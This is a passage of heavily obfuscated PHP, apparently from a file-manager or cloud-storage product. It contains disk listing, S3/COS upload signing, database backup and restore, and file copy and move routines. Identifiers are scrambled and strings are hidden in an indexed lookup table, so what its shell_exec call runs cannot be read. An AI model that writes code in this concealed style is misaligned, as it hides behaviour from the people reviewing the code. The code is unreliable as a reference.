} public static function diskListGet() { $´µÀ§ò“ÌÖö =& $_SERVER[èÍ×öˆøÉ]; $Û¶™é = array(); if ($GLOBALS[$´µÀ§ò“ÌÖö[6]][$´µÀ§ò“ÌÖö[1221]] == $´µÀ§ò“ÌÖö[1222]) { $ê¡æ = $´µÀ§ò“ÌÖö[1223]; for ($×äı = 0; $×äı < strlen($ê¡æ); $×äı++) { $âãçì†¸Áì = $ê¡æ[$×äı] . $´µÀ§ò“ÌÖö[1224]; if (file_exists($âãçì†¸Áì)) { $Û¶™é[] = $âãçì†¸Áì; } } return $Û¶™é; } if (!function_exists($´µÀ§ò“ÌÖö[98])) { $Û¶™é[] = $´µÀ§ò“ÌÖö[837]; return $Û¶™é; } $ç´€ = explode($´µÀ§ò“ÌÖö[229], shell_exec($´µÀ§ò“ÌÖö[1225])); array_shift($ç´€); array_pop($ç´€); $¢›±è·æƒ•‰– = array($´µÀ§ò“ÌÖö[1226], $´µÀ§ò“ÌÖö[1227], $´µÀ§ò“ÌÖö[1228], $´µÀ§ò“ÌÖö[1229]); foreach ($ç´€ as $´œ•–) { $×‚—šä = preg_split($´µÀ§ò“ÌÖö[1230], $´œ•–); $âãçì†¸Áì = $×‚—šä[count($×‚—šä) - 1]; if (!strstr($×‚—šä[0], $´µÀ§ò“ÌÖö[1231])) { continue; } if (!$âãçì†¸Áì || in_array($âãçì†¸Áì, $¢›±è·æƒ•‰–)) { continue; } $Û¶™é[] = rtrim($âãçì†¸Áì, $´µÀ§ò“ÌÖö[8]) . $´µÀ§ò“ÌÖö[8]; } return $Û¶™é; } public static function isSameDisk($êŒ‹ş, $˜—) { $Ÿã¹¨À¼ =& $_SERVER[èÍ×öˆøÉ]; if ($GLOBALS[$Ÿã¹¨À¼[6]][$Ÿã¹¨À¼[1221]] == $Ÿã¹¨À¼[1222]) { return strtolower(substr($êŒ‹ş, 0, 1)) == strtolower(substr($˜—, 0, 1)); } $¯« = self::diskList(); $„›ş÷Ì©¾ã = !1; $Ú® = !1; sort($¯«); $¯« = array_reverse($¯«); $êŒ‹ş = rtrim($êŒ‹ş, $Ÿã¹¨À¼[8]) . $Ÿã¹¨À¼[8]; $˜— = rtrim($˜—, $Ÿã¹¨À¼[8]) . $Ÿã¹¨À¼[8]; foreach ($¯« as $°ŒÌˆà) { $§¶ = strlen($°ŒÌˆà); if (!$„›ş÷Ì©¾ã && substr($êŒ‹ş, 0, $§¶) == $°ŒÌˆà) { $„›ş÷Ì©¾ã = $°ŒÌˆà; } if (!$Ú® && substr($˜—, 0, $§¶) == $°ŒÌˆà) { $Ú® = $°ŒÌˆà; } if ($„›ş÷Ì©¾ã && $Ú®) { break; } } return $„›ş÷Ì©¾ã === $Ú®; } public static function transferType($Ñ–, $¤±·ì”ôáıÂ) { $ì¦í =& $_SERVER[èÍ×öˆøÉ]; $Ş×ò = self::driverType($Ñ–); $©¨Êê‹ÕôšÜˆ = self::driverType($¤±·ì”ôáıÂ); if ($Ş×ò[$ì¦í[29]] == $©¨Êê‹ÕôšÜˆ[$ì¦í[29]] && $Ş×ò[$ì¦í[1232]] == $©¨Êê‹ÕôšÜˆ[$ì¦í[1232]]) { return $ì¦í[1233]; } if ($Ş×ò[$ì¦í[29]] == $ì¦í[866] && $©¨Êê‹ÕôšÜˆ[$ì¦í[29]] == $ì¦í[106]) { return $ì¦í[1132]; } if ($Ş×ò[$ì¦í[29]] == $ì¦í[106] && $©¨Êê‹ÕôšÜˆ[$ì¦í[29]] == $ì¦í[866]) { return $ì¦í[107]; } return $ì¦í[1234]; } public static function driverType($˜Òô) { $Ğô =& $_SERVER[èÍ×öˆøÉ]; $Íû™Ÿ“‡Ø = str_replace($Ğô[1235], $Ğô[33], strtolower($˜Òô->getType())); if ($Íû™Ÿ“‡Ø == $Ğô[753] || $Íû™Ÿ“‡Ø == $Ğô[1236] || $Íû™Ÿ“‡Ø == $Ğô[1237]) { $˜Òô = self::defaultDriverInit(); } else { if ($Íû™Ÿ“‡Ø == $Ğô[1139] || $Íû™Ÿ“‡Ø == $Ğô[1238]) { $˜Òô = IO::init($˜Òô->pathParse[$Ğô[1086]]); } } $óÉ¢¡¦½†èÍ = $˜Òô->path; $Íû™Ÿ“‡Ø = str_replace($Ğô[1235], $Ğô[33], strtolower($˜Òô->getType())); if ($Íû™Ÿ“‡Ø == $Ğô[106]) { return array($Ğô[29] => $Ğô[106], $Ğô[1232] => $Ğô[33], $Ğô[76] => $óÉ¢¡¦½†èÍ); } return array($Ğô[29] => $Ğô[866], $Ğô[1232] => $˜Òô->pathDriver, $Ğô[76] => $óÉ¢¡¦½†èÍ); } public static function pathDriverType($ÂÃ©ãÛê£) { return $ÂÃ©ãÛê£ ? self::driverType(IO::init($ÂÃ©ãÛê£)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ì†Èı¾) { parent::__construct($Ì†Èı¾); $this->signatureVersion($_SERVER[èÍ×öˆøÉ][212]); } public function uploadFormData($ŞÉ, $¤•—Ø = 3600) { $¨§¾± =& $_SERVER[èÍ×öˆøÉ]; $¨Ë˜±Ë = $¨§¾±[192]; $ÏÔÒâşš = $¨§¾±[230]; $¯ƒ› = $¨§¾±[1239]; $•â¼øÄŞÎ = gmdate($¨§¾±[1240], time() + $¤•—Ø); $íÈ…Ìì¦ = (string) time() . $¨§¾±[68] . (string) (time() + $¤•—Ø); $ÑÕ = array($¨§¾±[1241] => $•â¼øÄŞÎ, $¨§¾±[1242] => array(array($¨§¾±[1243] => $¨Ë˜±Ë), array($¨§¾±[1244] => $this->bucket), array($¨§¾±[1245], $¨§¾±[1246], $¨§¾±[33]), array($¨§¾±[1247] => $¯ƒ›), array($¨§¾±[1248] => $ÏÔÒâşš), array($¨§¾±[1249] => $this->accessKey), array($¨§¾±[1250] => $íÈ…Ìì¦))); $ÑÕ = json_encode($ÑÕ); $—÷•‘ø”Ê€´â = hash_hmac($¨§¾±[230], $íÈ…Ìì¦, $this->secret); $Â§¨ê„ê±ñ = sha1($ÑÕ); $Ï»¨äÀ = hash_hmac($¨§¾±[230], $Â§¨ê„ê±ñ, $—÷•‘ø”Ê€´â); $çÀ½ = array($¨§¾±[1243] => $¨Ë˜±Ë, $¨§¾±[1247] => $¯ƒ›, $¨§¾±[1251] => base64_encode($ÑÕ), $¨§¾±[1248] => $ÏÔÒâşš, $¨§¾±[1249] => $this->accessKey, $¨§¾±[1252] => $íÈ…Ìì¦, $¨§¾±[1253] => $Ï»¨äÀ, $¨§¾±[175] => $this->getHost()); return $çÀ½; } public function fileOutLink($ÄÔ…ÃñØ) { $çê¬ë =& $_SERVER[èÍ×öˆøÉ]; if (substr($ÄÔ…ÃñØ, 0, 7) == $çê¬ë[1254]) { $ÄÔ…ÃñØ = $çê¬ë[1255] . substr($ÄÔ…ÃñØ, 7); } header($çê¬ë[159] . $ÄÔ…ÃñØ); die; } } goto AïÃòÔèÏ•; f÷ÇµÉé£: class DbManage { function __construct($¨ş‚ª’Ò¨‘¯ë, $¤¶³µ´Œ¢© = '') { $this->database = $¨ş‚ª’Ò¨‘¯ë; $this->type = $¤¶³µ´Œ¢©; } public function model($âÛôâ‹Ì¤±õÄ = '') { return new ModelBase($âÛôâ‹Ì¤±õÄ, $_SERVER[èÍ×öˆøÉ][33], $this->database); } public function db($ÎÌ÷…°ş©­¢© = false) { $¤ãä =& $_SERVER[èÍ×öˆøÉ]; $ˆÏÙÒ¥Á = array_change_key_case($this->database); if ($this->type == $¤ãä[9] || !$ÎÌ÷…°ş©­¢©) { return $this->model()->db(); } $§ÙÎ¼Íİ = $ˆÏÙÒ¥Á[$¤ãä[969]]; $ˆÏÙÒ¥Á[$¤ãä[969]] = $¤ãä[33]; if ($ˆÏÙÒ¥Á[$¤ãä[791]] == $¤ãä[792]) { $¨­Ÿµ¿ = $ˆÏÙÒ¥Á[$¤ãä[793]]; $ˆÏÙÒ¥Á[$¤ãä[793]] = substr($¨­Ÿµ¿, 0, strrpos($¨­Ÿµ¿, $¤ãä[1056])); } $this->database = $ˆÏÙÒ¥Á; $ŞŸ¯ş±Ê¾Üı = $this->model()->db(); try { $±÷¢Ùî€ = $ŞŸ¯ş±Ê¾Üı->execute("\x73\x68\157\167\40\x64\x61\x74\x61\x62\x61\163\145\163\40\154\x69\x6b\145\x20\47{$§ÙÎ¼Íİ}\x27"); } catch (Exception $ëõ÷ÁÓ‹ÍĞŠ) { } if (!$±÷¢Ùî€) { $ŞŸ¯ş±Ê¾Üı->execute("\x63\x72\145\141\x74\x65\40\x64\141\x74\x61\142\x61\163\145\40\140{$§ÙÎ¼Íİ}\140"); } $ˆÏÙÒ¥Á[$¤ãä[969]] = $§ÙÎ¼Íİ; if ($ˆÏÙÒ¥Á[$¤ãä[791]] == $¤ãä[792]) { $ˆÏÙÒ¥Á[$¤ãä[793]] .= $¤ãä[1056] . $§ÙÎ¼Íİ; } $this->database = $ˆÏÙÒ¥Á; $ŞŸ¯ş±Ê¾Üı->execute("\x75\163\145\40\x60{$§ÙÎ¼Íİ}\x60"); return $ŞŸ¯ş±Ê¾Üı; } public function createTable($èÕ–, $’°Û„ = null) { $±³ã¾õšı =& $_SERVER[èÍ×öˆøÉ]; if (!IO::exist($èÕ–)) { ActionCall($±³ã¾õšı[1057], !0, 0); show_json(LNG($±³ã¾õšı[1058]), !1); } $ê×»Ûéµ› = sqlSplit(IO::getContent($èÕ–)); foreach ($ê×»Ûéµ› as $øâ»Î–Æ) { if ($’°Û„) { $òñÊ = stripos($øâ»Î–Æ, $±³ã¾õšı[1059]) === 0; if ($òñÊ) { $’°Û„->task[$±³ã¾õšı[1060]] += 1; } } $this->model()->db()->execute($øâ»Î–Æ); if ($’°Û„ && $òñÊ) { preg_match($±³ã¾õšı[1061], $øâ»Î–Æ, $Ÿ¤Ã»âÃò); $’°Û„->task[$±³ã¾õšı[1062]] = $Ÿ¤Ã»âÃò[1]; $’°Û„->update(1); } } $this->taskToCache($’°Û„); } public function insertTable($†¨¦ëœü, $óÂÔ®éó’¥ = null) { $¸ã«ú‰™Ù¶ =& $_SERVER[èÍ×öˆøÉ]; $›üÚÃıÒÚ = $this->model()->db(); $Çƒø–“‚˜´‚ = $é×Ûş…Ã¢ ? array($é×Ûş…Ã¢) : $›üÚÃıÒÚ->getTables(); foreach ($†¨¦ëœü as $—ÑŞ¸­Ú) { $é×Ûş…Ã¢ = basename($—ÑŞ¸­Ú, $¸ã«ú‰™Ù¶[781]); if (!in_array($é×Ûş…Ã¢, $Çƒø–“‚˜´‚)) { continue; } if ($óÂÔ®éó’¥) { $óÂÔ®éó’¥->task[$¸ã«ú‰™Ù¶[1062]] = $é×Ûş…Ã¢; } if (get_filesize($—ÑŞ¸­Ú) == 0) { continue; } $û¤Ë = $this->sqlToDb($—ÑŞ¸­Ú, $óÂÔ®éó’¥); if (!$û¤Ë) { ActionCall($¸ã«ú‰™Ù¶[1057], !0, 0); show_json(LNG($¸ã«ú‰™Ù¶[1063]) . "\x5b{$é×Ûş…Ã¢}\x5d", !1); } } $this->taskToCache($óÂÔ®éó’¥); } public function sqlFromDb($­ä, $òüäÔ§‰Ç, $Á§ = null, $°ıíñø˜ÑÑ = null) { if ($Á§) { $Á§->task[$_SERVER[èÍ×öˆøÉ][1062]] = $­ä; } $Ô¾Ó‚‹êÎ = $this->model($­ä); $…€³ = 0; $ª¡Œ¦Ù™Ã = 0; $×µ¢ = 10000; $„Š = fopen($òüäÔ§‰Ç, $_SERVER[èÍ×öˆøÉ][1064]); $œ¥¹Ç´ = $Ô¾Ó‚‹êÎ->getPk(); $İ•ÕÌ† = $Ô¾Ó‚‹êÎ->getDbFields(); do { $—ô§Ùûõå£ = array($œ¥¹Ç´ => array($_SERVER[èÍ×öˆøÉ][1011], $ª¡Œ¦Ù™Ã)); $ˆÏÎ¯ĞÛ×Ê = $Ô¾Ó‚‹êÎ->where($—ô§Ùûõå£)->field($İ•ÕÌ†)->order($œ¥¹Ç´ . $_SERVER[èÍ×öˆøÉ][1065])->limit($×µ¢)->select(); $ˆÏÎ¯ĞÛ×Ê = !empty($ˆÏÎ¯ĞÛ×Ê) ? $ˆÏÎ¯ĞÛ×Ê : array(); if (!($òŸœ”­šùË = count($ˆÏÎ¯ĞÛ×Ê))) { break; } $Ó¼åÒà¸œ = end($ˆÏÎ¯ĞÛ×Ê); $ª¡Œ¦Ù™Ã = $Ó¼åÒà¸œ[$œ¥¹Ç´]; $åîœŠ = array(); foreach ($ˆÏÎ¯ĞÛ×Ê as $¦Ì†›×µ²) { if ($­ä == $_SERVER[èÍ×öˆøÉ][1066] && $¦Ì†›×µ²[$_SERVER[èÍ×öˆøÉ][29]] == $_SERVER[èÍ×öˆøÉ][1067]) { $Î¬ÃîÓ– = json_decode($¦Ì†›×µ²[$_SERVER[èÍ×öˆøÉ][372]], !0); if ($Î¬ÃîÓ–[$_SERVER[èÍ×öˆøÉ][28]] == date($_SERVER[èÍ×öˆøÉ][746]) && !$Î¬ÃîÓ–[$_SERVER[èÍ×öˆøÉ][745]]) { continue; } } if ($°ıíñø˜ÑÑ) { $¦Ì†›×µ²[$_SERVER[èÍ×öˆøÉ][76]] = "\x7b\151\x6f\72{$°ıíñø˜ÑÑ}\x7d" . substr($¦Ì†›×µ²[$_SERVER[èÍ×öˆøÉ][76]], strlen("\x7b\x69\157\72{$¦Ì†›×µ²[$_SERVER[èÍ×öˆøÉ][819]]}\175")); $¦Ì†›×µ²[$_SERVER[èÍ×öˆøÉ][819]] = $°ıíñø˜ÑÑ; } $åîœŠ[] = $_SERVER[èÍ×öˆøÉ][1068] . $this->sqlEncode($¦Ì†›×µ²) . $_SERVER[èÍ×öˆøÉ][1069]; } $çŒì²Àòì™ = "\x49\116\x53\105\122\124\x20\x49\x4e\124\117\40\x60{$­ä}\x60\x20\50\x60" . implode($_SERVER[èÍ×öˆøÉ][1070], $İ•ÕÌ†) . $_SERVER[èÍ×öˆøÉ][1071]; fwrite($„Š, $çŒì²Àòì™ . implode($_SERVER[èÍ×öˆøÉ][1072], $åîœŠ) . $_SERVER[èÍ×öˆøÉ][68] . PHP_EOL); $…€³ += $òŸœ”­šùË; if ($Á§) { $Á§->update($òŸœ”­šùË); } } while ($×µ¢ == $òŸœ”­šùË); fclose($„Š); return $…€³; } public function sqlToDb($Ï«, $ğ§÷šØÔ = null) { $›Ôİ®ø¨‰¶‰Ÿ =& $_SERVER[èÍ×öˆøÉ]; $•Ï«éµ = $this->model()->db(); $Ó„ËŒÔ—üô = @fopen($Ï«, $›Ôİ®ø¨‰¶‰Ÿ[1073]); if (!$Ó„ËŒÔ—üô) { return !1; } $Ù»†Óµ÷€£ = 0; $¹Úšû€ = $›Ôİ®ø¨‰¶‰Ÿ[33]; $¸ÃáÉÁ¥ô = array(); $Àßİ = $this->type == $›Ôİ®ø¨‰¶‰Ÿ[9] ? 500 : 2000; $‘¦ò²“Ÿ = basename($Ï«, $›Ôİ®ø¨‰¶‰Ÿ[781]); $³‹ = 0; $Ó€ë•ê = 4194304 - 104858; $¡¹«„¯æ = 1000000 - 104858; while (!feof($Ó„ËŒÔ—üô)) { $—ÔŸî‹‹ÕÓ = trim(fgets($Ó„ËŒÔ—üô)); if (!$—ÔŸî‹‹ÕÓ) { continue; } $åş„’‰ÍÖ¹ = $this->sqlDecode($—ÔŸî‹‹ÕÓ, $this->type); if (stripos($åş„’‰ÍÖ¹, $›Ôİ®ø¨‰¶‰Ÿ[353]) === 0) { if (!$¹Úšû€) { $¹Úšû€ = $åş„’‰ÍÖ¹ . $›Ôİ®ø¨‰¶‰Ÿ[50]; } continue; } if ($ğ§÷šØÔ) { $ğ§÷šØÔ->task[$›Ôİ®ø¨‰¶‰Ÿ[1060]] += 1; } $Ù»†Óµ÷€£++; $¸ÃáÉÁ¥ô[] = rtrim(rtrim(trim($åş„’‰ÍÖ¹), $›Ôİ®ø¨‰¶‰Ÿ[47]), $›Ôİ®ø¨‰¶‰Ÿ[68]); $†“‡ä·œ·øæ = null; $òó = strlen($åş„’‰ÍÖ¹); $³‹ += $òó; if ($³‹ >= ($Àßİ == 500 ? $Ó€ë•ê : $¡¹«„¯æ)) { $†“‡ä·œ·øæ = array_pop($¸ÃáÉÁ¥ô); if ($Ù»†Óµ÷€£ > 1) { $Ù»†Óµ÷€£--; } } if ($Ù»†Óµ÷€£ >= $Àßİ || $†“‡ä·œ·øæ) { $åş„’‰ÍÖ¹ = $¹Úšû€ . implode($›Ôİ®ø¨‰¶‰Ÿ[47], $¸ÃáÉÁ¥ô); if (!$•Ï«éµ->execute($åş„’‰ÍÖ¹)) { return !1; } if ($ğ§÷šØÔ) { $ğ§÷šØÔ->update($Ù»†Óµ÷€£); } $¸ÃáÉÁ¥ô = array(); $Ù»†Óµ÷€£ = 0; $³‹ = 0; if ($†“‡ä·œ·øæ) { $¸ÃáÉÁ¥ô = array($†“‡ä·œ·øæ); $Ù»†Óµ÷€£ = 1; $³‹ = $òó; } } } fclose($Ó„ËŒÔ—üô); if (!empty($¸ÃáÉÁ¥ô)) { $åş„’‰ÍÖ¹ = $¹Úšû€ . implode($›Ôİ®ø¨‰¶‰Ÿ[47], $¸ÃáÉÁ¥ô); if (!$•Ï«éµ->execute($åş„’‰ÍÖ¹)) { return !1; } if ($ğ§÷šØÔ) { $ğ§÷šØÔ->update($Ù»†Óµ÷€£); } } return !0; } public function dropTable($Ó™¼Š = null) { $Ğ‡úÇœ = $this->model()->db(); $ª—ãÄò = $Ó™¼Š ? array($Ó™¼Š) : $Ğ‡úÇœ->getTables(); if (!$ª—ãÄò) { return; } foreach ($ª—ãÄò as $Ó™¼Š) { if ($Ó™¼Š) { $Ó™¼Š = strtolower($Ó™¼Š); } else { continue; } $Ğ‡úÇœ->execute("\x64\162\157\160\40\x74\x61\x62\x6c\x65\x20\151\146\x20\145\x78\151\x73\164\163\40\140{$Ó™¼Š}\140"); } } private function taskToCache($ç¼²ï‡ò³“ = null) { $çÈş§¬ù´åÜô =& $_SERVER[èÍ×öˆøÉ]; if (!$ç¼²ï‡ò³“) { return; } $´•ˆÎçãó‡­â = array($çÈş§¬ù´åÜô[1062] => $ç¼²ï‡ò³“->task[$çÈş§¬ù´åÜô[1062]], $çÈş§¬ù´åÜô[1060] => $ç¼²ï‡ò³“->task[$çÈş§¬ù´åÜô[1060]], $çÈş§¬ù´åÜô[1074] => $ç¼²ï‡ò³“->task[$çÈş§¬ù´åÜô[1074]]); if ($´•ˆÎçãó‡­â[$çÈş§¬ù´åÜô[1060]] == $´•ˆÎçãó‡­â[$çÈş§¬ù´åÜô[1074]]) { $´•ˆÎçãó‡­â[$çÈş§¬ù´åÜô[755]] = 1; } Cache::set($çÈş§¬ù´åÜô[1075] . $ç¼²ï‡ò³“->task[$çÈş§¬ù´åÜô[395]], $´•ˆÎçãó‡­â); $ç¼²ï‡ò³“->end(); } private function sqlEncode($°á²) { $À´Ò =& $_SERVER[èÍ×öˆøÉ]; $éµ„ß = array(); foreach ($°á² as $“î¸îà›´Ğ§¸) { if (is_array($“î¸îà›´Ğ§¸)) { $“î¸îà›´Ğ§¸ = json_encode_force($“î¸îà›´Ğ§¸); } $“î¸îà›´Ğ§¸ = addslashes($“î¸îà›´Ğ§¸); $“î¸îà›´Ğ§¸ = str_replace(array($À´Ò[1076], $À´Ò[229]), array($À´Ò[1077], $À´Ò[1078]), $“î¸îà›´Ğ§¸); $éµ„ß[] = str_replace($À´Ò[55], $À´Ò[1079], $“î¸îà›´Ğ§¸); } return $À´Ò[55] . implode($À´Ò[1080], $éµ„ß) . $À´Ò[55]; } private function sqlDecode($¿¸à´«î, $­Ñ¨¢çú÷‚) { $¨óø«—ğİ =& $_SERVER[èÍ×öˆøÉ]; $¿¸à´«î = str_replace(array($¨óø«—ğİ[1077], $¨óø«—ğİ[1078]), array($¨óø«—ğİ[1076], $¨óø«—ğİ[229]), $¿¸à´«î); if ($­Ñ¨¢çú÷‚ == $¨óø«—ğİ[9]) { $¿¸à´«î = stripslashes($¿¸à´«î); } return $¿¸à´«î; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($‰­’, $ÜŒ°Ü) { $ÁÅ»»¡ä†¥Î =& $_SERVER[èÍ×öˆøÉ]; $Û€Ü = $ÜŒ°Ü; $GLOBALS[$ÁÅ»»¡ä†¥Î[1081]] = $ÁÅ»»¡ä†¥Î[1082] . $‰­’; Hook::trigger($ÁÅ»»¡ä†¥Î[1082] . $‰­’ . $ÁÅ»»¡ä†¥Î[1083], $Û€Ü); $ÖÃ±äìÖëŠ = self::driverMake($ÜŒ°Ü[0]); if (method_exists($ÖÃ±äìÖëŠ, $‰­’)) { $é‘“ë÷ = @call_user_func_array(array($ÖÃ±äìÖëŠ, $‰­’), $ÜŒ°Ü); } else { if (method_exists($ÖÃ±äìÖëŠ, $ÁÅ»»¡ä†¥Î[1084])) { $é‘“ë÷ = @call_user_func_array(array($ÖÃ±äìÖëŠ, $‰­’), $ÜŒ°Ü); } else { if (method_exists(self, $‰­’)) { $é‘“ë÷ = @call_user_func_array(array(self, $‰­’), $ÜŒ°Ü); } else { $é‘“ë÷ = call_user_func_array(array(parent, $‰­’), $ÜŒ°Ü); } } } Hook::trigger($ÁÅ»»¡ä†¥Î[1082] . $‰­’ . $ÁÅ»»¡ä†¥Î[1085], $Û€Ü, $é‘“ë÷); return $é‘“ë÷; } public static function init($æ¼Ä¹´ï) { return self::driverMake($æ¼Ä¹´ï); } public static function copy($³ñí¾, $ì‘‹åï’, $¨ğ”©ö³› = false, $¾» = false) { return self::copyMoveStart($³ñí¾, $ì‘‹åï’, $¨ğ”©ö³›, $_SERVER[èÍ×öˆøÉ][543], $¾»); } public static function move($‘ŒË¥íÛ, $ŠÎ, $òé‘é = false, $ĞÆ = false) { return self::copyMoveStart($‘ŒË¥íÛ, $ŠÎ, $òé‘é, $_SERVER[èÍ×öˆøÉ][545], $ĞÆ); } private static function copyMoveStart($æÕÅ, $Ïé¡¿Ã³ï, $¥Öà´‚ˆÓã, $ƒÒ÷¹øËã, $Şùš) { $‰‡îÒƒß =& $_SERVER[èÍ×öˆøÉ]; $´ÏˆÎ = array($æÕÅ, $Ïé¡¿Ã³ï, $¥Öà´‚ˆÓã, $Şùš); Hook::trigger($‰‡îÒƒß[1082] . $ƒÒ÷¹øËã . $‰‡îÒƒß[1083], $´ÏˆÎ); $Ñ¹·’ñ = self::copyMove($æÕÅ, $Ïé¡¿Ã³ï, $¥Öà´‚ˆÓã, $ƒÒ÷¹øËã, $Şùš); Hook::trigger($‰‡îÒƒß[1082] . $ƒÒ÷¹øËã . $‰‡îÒƒß[1085], $´ÏˆÎ, $Ñ¹·’ñ); return $Ñ¹·’ñ; } public static function saveFile($ò…Şß†¾ü, $öğ³, $æÀËè“Ÿ“ = true) { $ˆ¼ñŒŠ…ù =& $_SERVER[èÍ×öˆøÉ]; $Ò™“º¿ü½ÇÑ = self::info($öğ³); $—¶ = self::driverMake($ò…Şß†¾ü); $™¥¯ü‹ = self::driverMake($öğ³); $„×´„ åÑÃİÖ = !1; if ($™¥¯ü‹->pathParse[$ˆ¼ñŒŠ…ù[1086]]) { $„×´„ åÑÃİÖ = $™¥¯ü‹; $Ûì•‘€˜ = $™¥¯ü‹->pathParse[$ˆ¼ñŒŠ…ù[1086]]; $™¥¯ü‹ = self::driverMake($Ûì•‘€˜); } if ($—¶->pathParse[$ˆ¼ñŒŠ…ù[1086]]) { $àôı = $—¶->pathParse[$ˆ¼ñŒŠ…ù[1086]]; $—¶ = self::driverMake($àôı); } $ÃÑÃ·˜Ó¶ = $™¥¯ü‹->pathFather($öğ³); $­¯äº = !0; if (!$æÀËè“Ÿ“ && self::driverIsSame($—¶, $™¥¯ü‹)) { $­¯äº = !1; } $ƒİëæ¬ƒ¸æ¹ = self::copyFile($—¶, $ò…Şß†¾ü, $™¥¯ü‹, $ÃÑÃ·˜Ó¶, $Ò™“º¿ü½ÇÑ[$ˆ¼ñŒŠ…ù[28]], $­¯äº); if ($„×´„ åÑÃİÖ) { $ƒİëæ¬ƒ¸æ¹ = $„×´„ åÑÃİÖ->getPathOuter($ƒİëæ¬ƒ¸æ¹); } return $ƒİëæ¬ƒ¸æ¹; } private static function copyMove($„¨êÉ–Ñíú, $ûü§ßßë, $ ó®ëŒ°¦ş”, $«İÏ¶Î·À, $êŠ›øß‡öí = false) { $æÛî =& $_SERVER[èÍ×öˆøÉ]; if (!$„¨êÉ–Ñíú || $„¨êÉ–Ñíú == $æÛî[8] || !$ûü§ßßë) { return !1; } ignore_timeout(); $Ò€„ = self::driverMake($„¨êÉ–Ñíú); $¥¾£…ëÔ¤Ëíü = self::driverMake($ûü§ßßë); $é¨† = $«İÏ¶Î·À == $æÛî[545]; $â©Ò = !1; if ($¥¾£…ëÔ¤Ëíü->pathParse[$æÛî[1086]]) { $â©Ò = $¥¾£…ëÔ¤Ëíü; $ûü§ßßë = $¥¾£…ëÔ¤Ëíü->pathParse[$æÛî[1086]]; $¥¾£…ëÔ¤Ëíü = self::driverMake($ûü§ßßë); } if ($Ò€„->pathParse[$æÛî[1086]]) { $„¨êÉ–Ñíú = $Ò€„->pathParse[$æÛî[1086]]; $Ò€„ = self::driverMake($„¨êÉ–Ñíú); } self::check($Ò€„, $„¨êÉ–Ñíú, $¥¾£…ëÔ¤Ëíü, $ûü§ßßë); Hook::trigger($æÛî[73], $Ò€„, $„¨êÉ–Ñíú, $¥¾£…ëÔ¤Ëíü, $ûü§ßßë); $ıÊªù¾ÚÔ¸ = self::driverIsSame($Ò€„, $¥¾£…ëÔ¤Ëíü); if ($ıÊªù¾ÚÔ¸) { if ($«İÏ¶Î·À == $æÛî[545] && !method_exists($¥¾£…ëÔ¤Ëíü, $æÛî[1087]) && trim($ûü§ßßë, $æÛî[8]) == trim($¥¾£…ëÔ¤Ëíü->pathFather($„¨êÉ–Ñíú), $æÛî[8])) { if ($Ò€„->pathThis($„¨êÉ–Ñíú) != $êŠ›øß‡öí && !$Ò€„->isTypeObject()) { return $Ò€„->rename($„¨êÉ–Ñíú, $êŠ›øß‡öí); } return $¥¾£…ëÔ¤Ëíü->getPathOuter($„¨êÉ–Ñíú); } if (method_exists($¥¾£…ëÔ¤Ëíü, $«İÏ¶Î·À)) { return $¥¾£…ëÔ¤Ëíü->{$«İÏ¶Î·À}($„¨êÉ–Ñíú, $ûü§ßßë, $ ó®ëŒ°¦ş”); } } $¦åÕ²» = $Ò€„->isFile($„¨êÉ–Ñíú); if (!$¦åÕ²» && $¥¾£…ëÔ¤Ëíü->getType() == $æÛî[753] && $Ò€„->getType() == $æÛî[106]) { $œáÔˆì = $¥¾£…ëÔ¤Ëíü->copyFolderFromIO($Ò€„, $„¨êÉ–Ñíú, $ûü§ßßë, $ ó®ëŒ°¦ş”, $é¨†, $êŠ›øß‡öí); } else { $œáÔˆì = self::copyPath($Ò€„, $„¨êÉ–Ñíú, $¥¾£…ëÔ¤Ëíü, $ûü§ßßë, $ ó®ëŒ°¦ş”, $é¨†, $¦åÕ²», $êŠ›øß‡öí); } if ($œáÔˆì && $é¨†) { $Ò€„->remove($„¨êÉ–Ñíú); } if ($â©Ò) { $œáÔˆì = $â©Ò->getPathOuter($œáÔˆì); } return $œáÔˆì; } private static function check($ , $ç³º¨ø½±ëú˜, $’ßÆõÊ, &$©ä) { $¼°Ù¼“Ìß¹ =& $_SERVER[èÍ×öˆøÉ]; if (self::driverIsSame($ , $’ßÆõÊ) && $ ->isFolder($ç³º¨ø½±ëú˜) && $ ->isParentOf($ç³º¨ø½±ëú˜, $©ä)) { show_json(LNG($¼°Ù¼“Ìß¹[1088]), !1); } if (!$ ->exist($ç³º¨ø½±ëú˜)) { show_json(LNG($¼°Ù¼“Ìß¹[105]), !1); } } private static function copyPath($¸«ëÊˆ¬–†, $Ú§µÌ¼, $éÈ¹, $İÕĞÂ, $ë³Üé, $ş—Ì¤úåæ¢, $¨, $Í„š = false) { $õÏ =& $_SERVER[èÍ×öˆøÉ]; $øˆÂµäŸÙ = empty($Í„š) && $Í„š !== $õÏ[191] ? $¸«ëÊˆ¬–†->pathThis($Ú§µÌ¼) : $Í„š; if ($ë³Üé) { $ïÔ = $éÈ¹->fileNameExist($İÕĞÂ, $øˆÂµäŸÙ); $øˆÂµäŸÙ = $éÈ¹->fileNameAuto($İÕĞÂ, $øˆÂµäŸÙ, $ë³Üé, !$¨); $ë³Üé = $ïÔ ? $ë³Üé : !1; } if ($¨) { return self::copyFile($¸«ëÊˆ¬–†, $Ú§µÌ¼, $éÈ¹, $İÕĞÂ, $øˆÂµäŸÙ, $ş—Ì¤úåæ¢); } if ($ë³Üé == REPEAT_RENAME_FOLDER) { $ë³Üé = !1; } $ˆ¥åÀÛÖ = rtrim($İÕĞÂ, $õÏ[8]) . $õÏ[8] . $øˆÂµäŸÙ; $¸¨®‚’Ñ£÷†² = $éÈ¹->mkdir($éÈ¹->getPath($ˆ¥åÀÛÖ)); $İÕĞÂ = $éÈ¹->getPathInner($¸¨®‚’Ñ£÷†²); $òõõ = $¸«ëÊˆ¬–†->listPath($Ú§µÌ¼, !0); $òõõ = is_array($òõõ) ? $òõõ : array($õÏ[74] => array(), $õÏ[75] => array()); $áòÔœ = array_merge($òõõ[$õÏ[74]], $òõõ[$õÏ[75]]); foreach ($áòÔœ as $“Õ½É— ) { $Œ‡÷ = $“Õ½É— [$õÏ[29]] == $õÏ[193]; $Ú§µÌ¼ = $¸«ëÊˆ¬–†->getPathInner($“Õ½É— [$õÏ[76]]); $²éšÕïÄéïÏƒ = self::copyPath($¸«ëÊˆ¬–†, $Ú§µÌ¼, $éÈ¹, $İÕĞÂ, $ë³Üé, 